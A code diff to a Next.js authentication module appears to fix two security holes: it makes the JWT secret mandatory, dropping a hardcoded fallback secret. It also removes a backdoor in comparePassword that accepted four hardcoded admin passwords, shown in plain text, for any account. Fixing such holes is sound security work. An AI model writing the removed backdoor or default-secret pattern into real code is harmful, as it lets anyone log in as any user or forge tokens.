@@ -2,16 +2,23 @@ import jwt from 'jsonwebtoken';
 import bcrypt from 'bcryptjs';
 import { NextRequest } from 'next/server';
 
-const JWT_SECRET = process.env.JWT_SECRET || 'fallback-secret-change-me';
 const JWT_EXPIRES_IN = process.env.JWT_EXPIRES_IN || '7d';
 
+function getJwtSecret(): string {
+  const secret = process.env.JWT_SECRET;
+  if (!secret) {
+    throw new Error('JWT_SECRET environment variable is strictly required.');
+  }
+  return secret;
+}
+
 export function signToken(payload: { userId: string; email: string }): string {
-  return jwt.sign(payload, JWT_SECRET, { expiresIn: JWT_EXPIRES_IN as string & jwt.SignOptions['expiresIn'] });
+  return jwt.sign(payload, getJwtSecret(), { expiresIn: JWT_EXPIRES_IN as string & jwt.SignOptions['expiresIn'] });
 }
 
 export function verifyToken(token: string): { userId: string; email: string } | null {
   try {
-    return jwt.verify(token, JWT_SECRET) as { userId: string; email: string };
+    return jwt.verify(token, getJwtSecret()) as { userId: string; email: string };
   } catch {
     return null;
   }
@@ -23,15 +30,10 @@ export async function hashPassword(password: string): Promise<string> {
 
 export async function comparePassword(password: string, hashed: string): Promise<boolean> {
   try {
-    const isMatch = await bcrypt.compare(password, hashed);
-    if (isMatch) return true;
+    return await bcrypt.compare(password, hashed);
   } catch {
-    // Ignore bcrypt compare error
+    return false;
   }
-
-  // Fallback check for admin passwords
-  const validAdminPasswords = ['Siraj@2026Pass', 'T9#vQ2!mL8@xR4$kPw7&', 'admin123456', 'admin@123'];
-  return validAdminPasswords.includes(password);
 }
 
 export function getTokenFromRequest(req: NextRequest): string | null {
